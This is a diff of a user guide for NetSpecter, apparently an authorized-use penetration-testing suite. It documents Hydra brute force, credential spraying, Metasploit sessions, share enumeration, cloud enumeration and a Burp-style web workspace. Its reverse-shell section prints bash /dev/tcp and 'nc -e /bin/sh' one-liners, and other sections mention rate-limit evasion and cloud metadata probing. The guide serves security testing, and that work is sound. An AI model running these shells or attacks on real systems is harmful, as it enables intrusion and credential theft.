+3. Your network is rendered using Cytoscape.js with hosts clustered by subnet and linked to their detected gateways
+4. Interact with the graph:
+   - Click any node to open its Host Details panel
+   - Use the **Layout** dropdown to switch between Force-Directed, Hierarchical, and Concentric layouts
+   - Click the **Camera** icon to export the graph as a PNG
+   - Use scroll-to-zoom and drag-to-pan to navigate large networks
+
+Hosts with open SMB ports (139/445) are styled distinctly from HTTP-only hosts, providing quick visual segmentation of attack surface.
+
+---
+
+## 15. Live Packet Capture & PCAP Export
+
+For deep forensic visibility into a specific host:
+
+1. Navigate to the **Passive Intelligence** panel, or right-click a host card and select **Capture Packets**
+2. Set a **Capture Filter** (BPF syntax, e.g., `host 192.168.1.5` or `tcp port 443`)
+3. Set a **Duration** (or leave blank for continuous capture)
+4. Click **Start Capture**
+
+The panel streams packet summaries in real time including:
+
+- Source / Destination IP and port
+- Protocol (TCP, UDP, ICMP, HTTP, TLS, DNS, ARP)
+- Payload snippet (for cleartext protocols)
+- Running stats: protocol distribution percentages, top talkers by byte count, cleartext protocol alerts
+
+Click **Stop & Save** at any time to write the capture to a `.pcap` file for Wireshark analysis.
+
+---
+
+## 16. Offensive Pentest Suite
+
+> **Authorization Required:** All offensive tools in this section perform active, potentially disruptive operations. You must have explicit written authorization to test any system you do not own. NetSpecter displays a **Pentest Consent Gate** on first use — you must accept it before any offensive tool activates.
+
+The consent gate is shown once per session. It records your acknowledgment in memory (not on disk) and does not expire until the application is closed.
+
+---
+
+### 16A. Multi-Protocol Brute-Force (Hydra)
+
+Automate credential discovery across SSH, FTP, Telnet, HTTP, SMB, RDP, and other services using the integrated Hydra engine.
+
+**Requirements:** Hydra installed and enabled in Settings.
+
+#### Starting a Brute-Force Attack
+
+#### Method 1 — From Host Details:
+
+1. Open the Host Details panel for your target
+2. Click the **Brute Force** button next to any detected service port (e.g., next to port 22 for SSH, port 80 for HTTP)
+3. The Brute-Force modal pre-fills the protocol based on the selected port
+
+#### Method 2 — From Header Button:
+
+1. Click the **⚔️ Brute Force** button in the top toolbar to open the modal manually
+2. Enter the target IP and select the protocol
+
+#### Configuring the Attack
+
+- **Protocol**: SSH, FTP, Telnet, HTTP-GET, HTTP-POST, SMB, RDP, IMAP, POP3, SMTP, MySQL, and others
+- **Username**: Single username or toggle **Load User List** to import a `.txt` wordlist
+- **Password Wordlist**: Click **Browse** to select a password list file. NetSpecter ships with `resources/wordlists/basicauth.txt` as a starter list
+- **Threads**: Number of parallel connection attempts (default 4 — increase with caution to avoid lockouts)
+- **Delay**: Milliseconds between requests per thread (useful for rate-limit evasion)
+
+#### Running
+
+Click **Start Brute-Force**. Results stream live:
+
+- Green rows = successful credential pair
+- Red rows = rejected
+- Orange rows = connection error
+
+Click **Stop** at any time. Export results as CSV using the **Export** button.
+
+---
+
+### 16B. Default Credential Spray
+
+Spray a target with known default credential pairs without Hydra — using pure Node.js transports. This is faster to start than Hydra for quick checks.
+
+**Supported Protocols:** SSH, HTTP Basic Auth, FTP, Telnet, SMB
+
+#### Starting a Spray
+
+1. Click the **Cred Spray** button in the top toolbar, or right-click a host → **Pentest** → **Default Credential Spray**
+2. Select the target protocol
+3. Choose a credential set:
+   - **Built-in defaults** — common default pairs (admin/admin, root/root, admin/password, etc.)
+   - **Custom list** — load a CSV file with `username,password` pairs
+4. Configure concurrency (default 5 simultaneous attempts)
+5. Click **Start Spray**
+
+Successful hits are highlighted in green with a distinct hit sound. Results can be exported to CSV. All credential data is held in memory only — nothing is written to disk.
+
+---
+
+### 16C. Metasploit RPC Control Plane
+
+Orchestrate the Metasploit Framework directly from NetSpecter via MSFRPC.
+
+**Requirements:** Metasploit Framework installed. Start the RPC daemon:
+
+```bash
+msfrpcd -P your_password -S -f
+# Default: listens on 127.0.0.1:55553
+```
+
+#### Connecting
+
+1. Click the **🎯 Metasploit** button in the top toolbar (only visible when Metasploit is detected in Settings)
+2. In the MSF modal, enter your RPC credentials:
+   - Host (default `127.0.0.1`)
+   - Port (default `55553`)
+   - Password
+3. Click **Connect** — NetSpecter establishes an MSFRPC session and loads the module database
+
+#### Browsing & Launching Exploits
+
+1. Use the **Module Search** box to filter exploits (e.g., `ms17_010`, `eternalblue`, `http`)
+2. Click a module row to select it — options populate in the right pane
+3. Fill in required options:
+   - `RHOSTS` — pre-filled from the currently selected network host if launched from Host Details
+   - `RPORT` — auto-filled from detected open ports when applicable
+   - `PAYLOAD` — select from compatible payloads in the dropdown
+4. Click **Run Exploit** — output streams to the terminal block in real time
+
+#### Session Management
+
+Active sessions appear in the **Sessions** tab of the MSF modal:
+
+- **Shell sessions** — interact with a basic command shell
+- **Meterpreter sessions** — full Meterpreter command interface
+- Click **Interact** to open a live terminal to the session
+- Click **Kill** to terminate a session
+
+---
+
+### 16D. Interactive Reverse Shell Hub
+
 A dedicated listener for incoming reverse shell connections with built-in payload generation.
 
-1. Go to the **Pentest** tab → **Reverse Shell Listener**.
-2. **Generate Payload**: Select your target shell (Bash, Python, PowerShell, PHP, or Netcat). The UI automatically populates your local IP (`LHOST`) and a default port (`4444`).
-3. **Copy & Execute**: Click **Copy to Clipboard** and execute the payload on your target machine.
-4. **Listen**: Click **Start Listener**. When a connection is received, a terminal session will open directly in the dashboard, allowing for live interaction.
+#### Opening the Listener
 
-### 19. SMB/NFS Share Explorer
-Expose misconfigured network shares and sensitive file storage.
+1. Click the **Reverse Shell** button in the top toolbar to open the RevShell panel (slides in from the right)
+2. Select the listener **Port** (default 4444)
+3. Select the **Shell Type**:
+   - **Bash** — `bash -i >& /dev/tcp/LHOST/LPORT 0>&1`
+   - **Python** — Python 3 `socket` one-liner
+   - **PowerShell** — PowerShell TCP reverse shell
+   - **PHP** — `exec()` based PHP reverse shell
+   - **Netcat** — `nc -e /bin/sh LHOST LPORT`
+4. NetSpecter auto-populates `LHOST` with your detected local IP address
+5. Click **Copy Payload** to copy the ready-to-execute command to clipboard
 
-1. Right-click a host → **Pentest** → **Enumerate Shares**.
-2. NetSpecter will attempt null sessions and credentialed checks for SMB and NFS exports.
-3. **Browse Files**: If shares are found, they will appear in the explorer. Click a share to browse its directory structure.
-4. **Download**: Right-click any file to download it to your local machine for analysis.
+#### Starting the Listener
 
-### 20. Web Directory Fuzzer
-Discover hidden files and directories on web servers.
+Click **Start Listener**. NetSpecter opens a TCP server on the configured port in the main process.
 
-1. Right-click a host → **Pentest** → **Fuzz Web Directories**.
-2. **Configure Wordlist**: Use the built-in "Common Paths" list or load your own large-scale wordlist.
-3. **Filters**: Specify which status codes to report (e.g., 200, 301, 302, 403).
-4. **Start Fuzzing**: NetSpecter will execute parallel HTTP requests, streaming hits (like `/.git/config` or `/admin/`) back to the UI results table.
+When a reverse shell connects:
 
-## 21. Persisting Data (Saving and Loading)
+- A terminal session opens in the panel
+- Type commands directly — responses stream back in real time
+- Click **Kill Session** to terminate the connection
+- Multiple simultaneous connections are supported — each gets its own session tab
 
-Any Nmap Scans, Pentest results, and Native Port Banners queried in the current application state session are saved in the DOM.
+---
 
-* Click **Save Results** in the top control bar to serialize the exact state to `scan_results.json` locally.
-* You can safely close the application, open it, and click **Load Results** to re-instantiate your layout perfectly, saving hours of rescanning downtime.
+### 16E. SMB/NFS Share Explorer
+
+Expose misconfigured network shares and sensitive data storage.
+
+**Requirements:** `smbclient` (Linux/macOS) or `impacket-smbclient` (Windows) installed and enabled in Settings.
+
+#### Enumerating Shares
+
+**Method 1** — Click **Enumerate Shares** in the Host Details panel when ports 139 or 445 are open.
+
+**Method 2** — Click the **🗂️ Share Enum** button in the top toolbar and enter a target IP manually.
+
+The panel performs:
+
+1. Null session enumeration attempt (no credentials)
+2. Guest session attempt
+3. If credentials are provided (optional), authenticated enumeration
+
+#### Browsing Files
+
+When shares are found, they appear as folders in the left pane. Click a share to expand its directory tree:
+
+- Navigate using the breadcrumb bar at the top of the file pane
+- Click any file to see metadata (size, modified date, permissions)
+- Right-click a file → **Download** to save it locally for analysis
+
+Shares are color-coded by access level:
+
+- **Red** — world-readable (no credentials required)
+- **Orange** — guest-accessible
+- **Blue** — authenticated access only
+- **Gray** — access denied
+
+---
+
+### 16F. Web Directory Fuzzer
+
+Discover hidden files and directories on web servers with zero external dependencies.
+
+#### Opening the Fuzzer
+
+**Method 1** — Click the **Dir Fuzz** button next to any detected HTTP port in the Host Details panel.
+
+**Method 2** — Click the **🔎 Dir Fuzz** button in the top toolbar and enter a base URL manually.
+
+#### Configuration
+
+- **Wordlist**:
+  - **Built-in** — 50 common paths (`/admin`, `/config`, `/.git`, `/backup`, `/api`, etc.)
+  - **Custom file** — browse to a wordlist file (one path per line, up to 100,000 entries)
+- **Extensions** — append file extensions to each path: `.php`, `.html`, `.bak`, `.txt`, `.json`. Toggle individually.
+- **Status Code Filter** — show only responses with selected status codes (200, 201, 301, 302, 403, 500)
+- **Concurrency** — simultaneous requests, 1–50 (default 20)
+- **Timeout** — per-request timeout in milliseconds
+
+#### Running the Fuzz
+
+Click **Start Fuzzing**. Results appear in the table as hits arrive:
+
+| Column | Description |
+| --- | --- |
+| Status | HTTP status code (color-coded: 200=green, 3xx=blue, 403=orange, 5xx=red) |
+| Path | The discovered path |
+| Size | Response body size in bytes |
+| Duration | Request round-trip time |
+
+Click any row to see the response headers and a body preview. Click **Export CSV** to save the full results. Click **Clear** to reset.
+
+---
+
+## 17. Security Monitoring & Hardening
+
+### Continuous Hardening Monitor
+
+The Hardening Monitor schedules recurring security snapshots of individual hosts and alerts when the security posture changes.
+
+#### Starting a Monitoring Schedule
+
+1. Click the **📊 Hardening** button in the top toolbar to open the Hardening Monitor panel
+2. Select a target host from your dashboard (or enter an IP manually)
+3. Choose a **scan interval**: 5 minutes, 15 minutes, 1 hour, 6 hours, or 24 hours
+4. Choose what to monitor:
+   - Open port changes
+   - Service banner changes
+   - SSL/TLS certificate changes (expiry, CN changes, fingerprint changes)
+   - New CVEs from Nmap vuln scripts
+5. Click **Start Monitoring**
+
+#### Delta Alerts
+
+Each scheduled scan is compared against the last known baseline. The delta view shows:
+
+- **🟢 Added** — new open ports or new CVEs found since last scan
+- **🔴 Removed** — ports that were open are now closed (could indicate service restart or firewall change)
+- **🟡 Changed** — banner text changed (potential patching or version change)
+
+Alert cards appear in the panel and optionally on the host card. A persistent history of all delta events is maintained per-host for the session.
+
+### Security Analyzer
+
+The Security Analyzer aggregates all available scan data for a host and produces a prioritized risk assessment.
+
+1. Open the Host Details panel
+2. Click **Analyze Risk** in the Actions section
+3. The analyzer combines:
+   - Open ports and their associated service risks
+   - OS fingerprint (EOL systems flagged)
+   - CVE findings from Nmap scans
+   - Banner strings with known vulnerable version patterns
+   - Passive intel findings (cleartext credentials, DHCP/DNS anomalies)
+4. Results are displayed as a risk score (0–100) with a breakdown by category:
+   - Network exposure (open attack surface)
+   - Patch level (CVE severity distribution)
+   - Protocol risk (cleartext protocols detected)
+   - Configuration risk (default credentials, weak TLS, missing security headers)
+5. Each category includes specific, actionable remediation recommendations
+
+---
+
+## 18. Container & Cloud Enumeration
+
+The Cloud Enum panel probes discovered hosts for exposed container orchestration and cloud infrastructure endpoints — some of the most high-severity misconfigurations found in modern environments.
+
+#### Opening Cloud Enum
+
+Click the **☁️ Cloud Enum** button in the top toolbar, or open Host Details and click **Cloud Enum** when container indicator ports (2375, 2379, 6443, 8443, 10250, etc.) are detected. These ports trigger a prominent **⚠ CRITICAL PORTS** badge on the host card.
+
+#### Available Probes
+
+Toggle individual probes before scanning:
+
+| Probe | Default Port | What It Checks |
+| --- | --- | --- |
+| Docker Daemon | 2375 / 2376 | Unauthenticated Docker API (`/containers/json`, `/images/json`) |
+| Kubernetes Kubelet | 10250 / 10255 | Pod listing, exec endpoints, anonymous access |
+| Kubernetes API Server | 6443 / 8443 | Unauthenticated cluster access, RBAC bypass |
+| etcd | 2379 | Key-value store access, Kubernetes secret exposure |
+| AWS IMDSv1 | — | `169.254.169.254` metadata endpoint |
+| GCP Metadata | — | `metadata.google.internal` compute metadata |
+| Azure IMDS | — | Azure instance metadata |
+| Consul | 8500 | KV store access, service registry |
+| Vault | 8200 | Secrets engine access |
+| Prometheus | 9090 | Metrics endpoint, target enumeration |
+| Grafana | 3000 | Default/no authentication check |
+| Portainer | 9000 | Container management UI access |
+
+#### Running the Scan
+
+1. Select target host and toggle desired probes
+2. Set concurrency (default 5 parallel probes)
+3. Click **Start Enumeration**
+
+#### Reading Results
+
+Findings are displayed as cards, color-coded by severity:
+
+- **🔴 Critical** — unauthenticated access to container/cloud management APIs (immediate RCE or secret extraction risk)
+- **🟡 Warning** — partially exposed endpoints, version disclosure
+- **🔵 Info** — service detected but access denied
+
+Click any finding card to see the raw response, the specific endpoint that was probed, and remediation guidance. Export all findings as JSON using the **Export** button.
+
+---
+
+## 19. Web Application Testing Workspace
+
+NetSpecter includes a complete web application security testing workspace — accessible by clicking the **Web App** tab at the top of the main window. This switches the view from the Network workspace to the Web App workspace, which contains eight integrated tools.
+
+> **Authorization Required:** Active scanning, active crawling, and Intruder attacks require the Pentest Consent Gate to be accepted.
+
+---
+
+### 19A. Intercepting HTTPS Proxy
+
+The intercepting proxy is the foundation of the Web App workspace. It sits between your browser and the target application, giving you full visibility into every HTTP and HTTPS request.
+
+#### How the Proxy Works
+
+NetSpecter runs an HTTP proxy server on `127.0.0.1:8080` (port configurable in Settings). For HTTPS, it handles `CONNECT` tunnel requests and issues a dynamically generated TLS certificate for each hostname — signed by a locally-generated Certificate Authority (CA). This allows NetSpecter to decrypt and inspect all HTTPS traffic transparently.
+
+#### Setup — One-Time CA Certificate Installation
+
+You only need to do this once per browser/system.
+
+1. Open NetSpecter **Settings** → **Web App Proxy** section
+2. Click **Export CA Certificate** — saves `netspectre-ca.pem` to your Downloads folder
+3. Install the certificate in your browser's trust store:
+
+   **Chrome / Edge:**
+   Settings → Privacy and Security → Security → Manage Certificates → Authorities → Import → select `netspectre-ca.pem` → check "Trust this certificate for identifying websites"
+
+   **Firefox:**
+   Settings → Privacy & Security → Certificates → View Certificates → Authorities → Import → select `netspectre-ca.pem` → check "Trust this CA to identify websites"
+
+   **macOS System Keychain (for Safari and system-wide):**
+
+   ```bash
+   sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain netspectre-ca.pem
+   ```
+
+   **Linux (Debian/Ubuntu):**
+
+   ```bash
+   sudo cp netspectre-ca.pem /usr/local/share/ca-certificates/netspectre-ca.crt
+   sudo update-ca-certificates
+   ```
+
+4. Configure your browser's proxy settings:
+   - HTTP Proxy: `127.0.0.1`
+   - Port: `8080` (or your configured port)
+   - Enable "Also use for HTTPS"
+
+#### Starting the Proxy
+
+In the Web App workspace → **Proxy** tab:
+
+1. Click **Start Proxy** — the status indicator turns green
+2. Browse the target application in your browser
+3. All requests appear in the **Request History** table in real time
+
+#### Request History Table
+
+Each row shows: timestamp, HTTP method, status code, hostname, path, response size, and duration. Click any row to open the full request/response viewer with syntax-highlighted headers and body.
+
+#### Filtering History
+
+Use the filter bar above the table to narrow results by:
+
+- Hostname (partial match)
+- HTTP method (GET, POST, PUT, etc.)
+- Status code (exact or range, e.g., `4xx`)
+- Path contains (partial string match)
+- Response size range
+
+#### Intercept Mode
+
+Toggle **Intercept** to pause in-flight requests for manual inspection:
+
+1. When a request is intercepted, it appears in the **Intercept** pane with the full raw request
+2. Edit any part of the request (headers, URL, body)
+3. Click **Forward** to send the modified request, or **Drop** to discard it
+
+#### HAR Export
+
+Click **Export HAR** to save the full request history as a [HAR 1.2](http://www.softwareishard.com/blog/har-12-spec/) JSON file, compatible with browser DevTools, Postman, and security analysis tools.
+
+---
+
+### 19B. Web Crawling & Sitemap
+
+The Sitemap tab builds a structured map of the target application's attack surface.
+
+#### Passive Crawling (Always On)
+
+Every request that flows through the proxy is automatically added to the sitemap. No additional action required. The sitemap tree populates as you browse normally.
+
+#### Active Crawling (Playwright)
+
+Active crawling launches a headless Chromium browser to follow links, submit forms, and discover JavaScript-rendered endpoints that would be invisible to a proxy-only approach.
+
+**Requirements:** Playwright / Chromium executable path configured in Settings.
+
+1. In the Sitemap tab, click **Active Crawl**
+2. Enter the seed URL (e.g., `https://target.com`)
+3. Configure:
+   - **Depth limit** — how many link-hops from the seed to follow (default 3)
+   - **Page limit** — maximum pages to visit (default 100)
+4. Click **Start Crawl** — discovered endpoints stream into the sitemap in real time
+5. Click **Stop** at any time
+
+#### Reading the Sitemap
+
+The sitemap renders as a collapsible tree grouped by hostname and path depth. Each endpoint shows:
+
+- HTTP method badge
+- Endpoint type icon: **API** (JSON), **GraphQL**, **WebSocket**, **HTML**, **Asset**
+- Parameter count (URL query params + body params discovered)
+
+#### Context Menu Actions
+
+Right-click any endpoint in the sitemap to:
+
+- **Send to Repeater** — opens the endpoint as a pre-loaded Repeater request
+- **Send to Scanner** — adds the endpoint to the Scanner's target queue
+- **Send to Intruder** — opens the endpoint as an Intruder template
+- **Copy URL** — copies the full URL to clipboard
+
+---
+
+### 19C. Active Vulnerability Scanner
+
+The Scanner automatically tests target endpoints for the OWASP Top 10 vulnerability categories.
+
+#### Selecting a Target
+
+In the Scanner tab, choose one of three target modes:
+
+- **URL** — scan a single URL directly (enter it in the input field)
+- **Proxy History** — bulk scan all requests captured by the proxy (optionally filtered)
+- **Sitemap** — scan all endpoints in the current sitemap
+
+#### Configuring Modules
+
+Ten scan modules are available — each maps to an OWASP 2021 category. Toggle each on or off:
+
+| Module | OWASP Category | What It Tests |
+| --- | --- | --- |
+| SQLi | A03 Injection | Time-based, error-based, boolean, UNION injection |
+| XSS | A03 Injection | Reflected, DOM sink hints, encoded bypasses |
+| SSRF | A10 SSRF | Cloud metadata endpoints, timing-based blind |
+| XXE | A03 Injection | File read probes, parser delta detection |
+| Command Injection | A03 Injection | Output reflection, time-based blind |
+| Path Traversal | A01 Access Control | LFI via traversal sequences, null byte |
+| CORS | A05 Misconfiguration | Arbitrary origin, null origin, subdomain bypass |
+| HTTP Headers | A05 Misconfiguration | Missing security headers, version disclosure, cookie flags |
+| Broken Auth | A07 Auth Failures | Rate-limit bypass, user enum, weak creds, JWT |
+| Deserialization | A08 Integrity Failures | PHP, Java, Python, .NET, Node.js object patterns |
+
+#### Scanner Settings
+
+- **Concurrency** — parallel requests per module (1–20, default 10)
+- **Timeout** — per-request timeout in milliseconds
+- **Follow redirects** — include or exclude redirect chains
+
+#### Running the Scan
+
+Click **Start Scan**. Findings stream into the results table in real time, sorted by severity.
+
+#### Reading Findings
+
+Each finding row shows: severity badge, module name, affected URL, and parameter. Click a row to expand the detail section:
+
+| Field | Description |
+| --- | --- |
+| **Description** | What the vulnerability is and why it matters |
+| **Evidence** | The specific request and response that triggered the finding (payload sent, response snippet) |
+| **Remediation** | Specific fix guidance for this finding type |
+| **References** | Links to OWASP, CVE, or CWE entries |
+
+#### Send to Repeater
+
+Click **Send to Repeater** on any finding to open the exact triggering request in Repeater for manual follow-up.
+
+#### Network Badge
+
+When a scanner finding involves a host that is also in the Network workspace, a `.web-vuln-badge` is automatically injected onto that host's card in the Network tab — creating a visual link between web-layer findings and network-layer hosts.
+
+#### Exporting Results
+
+Click **Export** and choose:
+
+- **JSON** — full findings array with all fields, suitable for programmatic processing
+- **CSV** — one finding per row (severity, title, URL, parameter, evidence)
+- **HTML Report** — styled standalone report with severity-grouped sections and remediation guidance
+
+---
+
+### 19D. Request Repeater
+
+The Repeater lets you manually modify and retransmit any HTTP request, bypassing browser CORS restrictions entirely.
+
+#### Opening Repeater
+
+- Right-click any row in the Proxy History table → **Send to Repeater**
+- Right-click any sitemap endpoint → **Send to Repeater**
+- Click **Send to Repeater** from any Scanner finding
+- Click the **＋** button in the Repeater tab to open a blank request
+
+#### Editing a Request
+
+The left pane contains a raw HTTP request editor:
+
+```http
+POST /api/login HTTP/1.1
+Host: target.com
+Content-Type: application/json
+Authorization: Bearer eyJ...
+
+{"username":"admin","password":"test"}
+```
+
+Edit any field — method, path, headers, or body — and click **Send**. The right pane shows the response:
+
+- Raw HTTP response headers
+- Response body (syntax-highlighted for JSON/HTML/XML)
+- Status code, response size, and round-trip time
+
+#### Request History
+
+Each Repeater tab maintains its own history. Use the **◀ Back** and **▶ Forward** buttons to navigate through previous requests in that tab. This allows you to compare responses across multiple manual modifications.
+
+#### Multiple Tabs
+
+Click **＋ New Tab** to open additional independent Repeater sessions. Each tab maintains its own state, history, and target host settings.
+
+#### HTTPS & TLS
+
+Repeater sends requests directly via Node.js — no browser involved. TLS certificate validation can be toggled per-tab (for testing self-signed or expired certificates without changing global settings).
+
+---
+
+### 19E. Intruder
+
+Intruder automates customizable fuzzing attacks against HTTP endpoints — similar to Burp Suite Intruder.
+
+#### Setting Up a Request Template
+
+Open a request in Intruder (from Proxy History right-click, Sitemap, or Scanner finding). The raw request appears in the template editor.
+
+#### Marking Positions
+
+Highlight any value in the request template and click **Add §** to wrap it with position markers:
+
+```http
+POST /api/login HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"username":"§admin§","password":"§password§"}
+```
+
+Each `§value§` pair is an injection position. The original value between markers is preserved as a placeholder.
+
+#### Choosing an Attack Type
+
+| Attack Type | Behavior | Use Case |
+| --- | --- | --- |
+| **Sniper** | One payload list; iterates through each position independently | Username/password field testing, one variable at a time |
+| **Battering Ram** | One payload list; same payload applied to all positions simultaneously | Session token or shared-value fuzzing |
+| **Pitchfork** | Multiple payload lists; applies list[n] to position[n] in parallel | Credential pairs (username list + matching password list) |
+| **Cluster Bomb** | Multiple payload lists; tests every combination (Cartesian product) | Full credential stuffing |
+
+#### Configuring Payloads
+
+For each position (or for the shared list, depending on attack type):
+
+- **Manual list** — type or paste payloads one per line
+- **Built-in wordlists** — select from NetSpecter's bundled lists (usernames, passwords, SQLi payloads, XSS payloads)
+- **Load file** — browse to a custom `.txt` wordlist
+
+#### Running the Attack
+
+- Set **Concurrency** (1–20 simultaneous requests) and **Request Timeout**
+- Click **Start Attack**
+
+Results stream into the table as requests complete:
+
+| Column | Description |
+| --- | --- |
+| # | Request index |
+| Payload | Payload(s) used |
+| Status | HTTP response status code |
+| Length | Response body size in bytes |
+| Duration | Round-trip time in milliseconds |
+| Delta | Response size difference from baseline |
+
+#### Analysing Results
+
+Sort by **Length** or **Delta** to spot anomalous responses that may indicate a successful injection or authentication bypass. Click any row to see the full response in the detail pane.
+
+---
+
+### 19F. Token Sequencer
+
+The Token Sequencer analyzes the randomness quality of session tokens, CSRF tokens, API keys, and any other string values generated by the server.
+
+#### Capturing Tokens
+
+1. In the Sequencer tab, configure the **Token Source**:
+   - Paste a sample response that contains the token
+   - Or send a request from Proxy History that generates a token
+2. Identify the **Token Location** using the extraction editor:
+   - Cookie name (e.g., `PHPSESSID`)
+   - Response header name
+   - JSON path (e.g., `$.token`)
+   - Regex pattern
+
+#### Collecting Samples
+
+Click **Start Capture** — Sequencer repeatedly requests the configured endpoint and extracts a token from each response. The default sample count is 100 tokens; increase to 1000+ for more accurate statistical results.
+
+#### Analysis Results
+
+Once collection is complete, click **Analyze** to run statistical tests:
+
+- **Entropy estimate** — bits of effective entropy (aim for ≥ 64 bits for security)
+- **Bit-level entropy chart** — per-bit entropy visualization; flat lines indicate predictable bit positions
+- **FIPS 140-2 Tests**:
+  - Monobit: proportion of 1-bits (should be ~50%)
+  - Poker: distribution of 4-bit groups (chi-squared)
+  - Runs: counts of consecutive identical bits
+  - Long Runs: maximum run length (should be ≤ 25)
+- **Overall verdict**: Pass / Marginal / Fail with explanation
+
+A "Fail" verdict means the token generation is statistically predictable and tokens may be forgeable.
+
+---
+
+### 19G. Encoder / Decoder
+
+A multi-format encoding, decoding, and hashing toolbox — no IPC required, runs entirely in the browser.
+
+#### Using the Toolbox
+
+1. Paste any input into the text area
+2. Click an operation from the toolbar:
+
+   | Operation | Description |
+   | --- | --- |
+   | URL Encode | `%XX` encoding for URL contexts |
+   | URL Decode | Decode `%XX` sequences |
+   | HTML Encode | Convert `<`, `>`, `&`, `"` to HTML entities |
+   | HTML Decode | Reverse HTML entity encoding |
+   | Base64 Encode | Standard Base64 |
+   | Base64 Decode | Base64 decode (handles padding) |
+   | Hex Encode | Convert each byte to `\xNN` hex |
+   | Hex Decode | Decode hex string |
+   | MD5 | 128-bit hash |
+   | SHA-1 | 160-bit hash |
+   | SHA-256 | 256-bit hash |
+   | SHA-512 | 512-bit hash |
+   | GZIP Decompress | Decompress a GZIP blob |
+
+3. The result appears in the output area immediately
+4. Click **Copy** to copy the result to clipboard
+
+#### Smart Decode
+
+Click **Smart Decode** to automatically detect and peel encoding layers. Useful for multi-encoded values commonly used in XSS or bypass payloads (e.g., double-URL-encoded, Base64-encoded-then-URL-encoded).
+
+#### Chaining Operations
+
+Click **Use Output as Input** to chain multiple operations. For example: `Hex Encode` → `Base64 Encode` → output is a double-encoded representation.
+
+---
+
+### 19H. Response Comparer
+
+Compare two HTTP responses side-by-side to spot subtle differences — invaluable for detecting boolean-based injection, username enumeration, or access control differences.
+
+#### Loading Responses
+
+There are three ways to populate the two comparison panes:
+
+- **From Proxy History** — right-click any history row and select **Send to Comparer (Left)** or **Send to Comparer (Right)**
+- **From Repeater** — click **Send to Comparer** in the Repeater response pane
+- **Paste manually** — click the **Edit** button in either pane and paste any text
+
+#### Comparison Modes
+
+- **Word-level** — highlights individual changed words; best for readable text like HTML or JSON
+- **Byte-level** — highlights every changed character; best for binary or compressed data
+
+#### Reading the Diff
+
+- **Green highlight** — content present in the right pane but not the left (added)
+- **Red highlight** — content present in the left pane but not the right (removed)
+- **No highlight** — identical content
+- The **Summary bar** at the top shows total added/removed/changed token counts
+
+#### Use Cases
+
+- Compare a login response for a valid username vs. an invalid username (user enumeration)
+- Compare a response with `AND 1=1` vs. `AND 1=2` in a parameter (boolean SQLi confirmation)
+- Compare authenticated vs. unauthenticated responses to the same endpoint (IDOR / broken access control)
+- Compare two session token values character-by-character (token structure analysis)
+
+---
+
+## 20. Persisting & Sharing Session Data
+
+### Saving a Session
+
+Click **💾 Save Results** in the top control bar. NetSpecter serializes the complete current state to a JSON file:
+
+- All discovered hosts, open ports, OS fingerprints, and vendor data
+- Deep scan results, service banners, and SSL certificate details
+- All discovered CVEs from Nmap vuln scans
+- Hardening Monitor delta history
+- SNMP walk results
+- Cloud enumeration findings
+
+Select the output path in the native file dialog and click **Save**.
+
+### Loading a Session
+
+Click **📂 Load Results** in the top control bar. Browse to a previously saved JSON file and open it. NetSpecter re-instantiates the exact saved state — all host cards, port data, and findings are restored without rescanning.
+
+> **Note:** Proxy request history (the SQLite database) is stored separately in your OS application data directory and persists automatically between app restarts. It is not included in the JSON session file.
+
+### Exporting Individual Feature Data
+
+Most features have their own export options:
+
+| Feature | Export Format | How to Access |
+| --- | --- | --- |
+| Proxy History | HAR 1.2 JSON | Proxy tab → Export HAR |
+| Scanner Findings | JSON / CSV / HTML | Scanner tab → Export |
+| Cloud Enum Findings | JSON | Cloud Enum panel → Export |
+| Dir Fuzzer Results | CSV | Dir Fuzz panel → Export CSV |
+| Brute Force Results | CSV | Brute Force modal → Export |
+| Credential Spray | CSV | Cred Spray panel → Export |
+| SNMP Walk Data | Clipboard / text | SNMP results → Copy |
+| Topology Graph | PNG | Topology tab → Camera icon |
+
+---
+
+## 21. Keyboard Shortcuts & UI Tips
+
+### Global Shortcuts
+
+| Shortcut | Action |
+| --- | --- |
+| `Ctrl+S` | Save session |
+| `Ctrl+O` | Load session |
+| `Escape` | Close open modal or panel |
+| `Ctrl+Shift+I` | Open Electron DevTools (development builds only) |
+
+### UI Tips
+
+- **Resizable panels** — drag the divider handle between the host grid and the Details panel to resize. Drag the divider in the Share Explorer or Repeater to resize sub-panes.
+- **Right-click context menu** — right-clicking any host card reveals quick actions: Deep Scan, Brute Force, Dir Fuzz, Cloud Enum, Enumerate Shares, Capture Packets.
+- **Port badges are clickable** — click any blue port badge in the Details panel to trigger a targeted Nmap service scan on that specific port (requires Nmap mode to be active).
+- **Network → Web pivot** — clicking the **Dir Fuzz** or **Send to Scanner** button on any HTTP port in the Details panel automatically opens the Web App workspace with that URL pre-loaded.
+- **Dependency indicators** — buttons and sections that require an uninstalled external tool are hidden entirely rather than shown as disabled, keeping the UI clean.
+- **Consent gate** — if you accidentally dismiss the pentest consent gate, it will reappear the next time you attempt an offensive action (it only auto-dismisses after explicit acceptance, not on close/escape).
+- **Auto-updates** — NetSpecter checks for updates on startup. When a new version is available, a banner appears with a one-click download. Updates are applied on next restart.
